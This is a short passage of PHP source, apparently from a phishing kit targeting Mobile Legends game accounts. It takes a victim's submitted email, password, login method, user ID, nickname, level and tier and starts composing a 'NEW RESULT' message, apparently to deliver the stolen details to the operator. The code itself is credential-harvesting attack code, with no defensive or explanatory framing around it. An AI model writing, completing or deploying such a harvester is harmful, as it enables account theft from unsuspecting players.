...
if (empty($email) && empty($password) && empty($login) && empty($userIdForm) && empty($nickname) && empty($level) && empty($tier)) {
	header("Location: index.php");
} else {

	// KONTEN RESULT AKUN
	$subjek = "NEW RESULT Akun ML | ID $userIdForm | LEVEL $level | LOGIN $login";
	$pesan = <<<EOD
	<!DOCTYPE html>
	<html>
	<head>
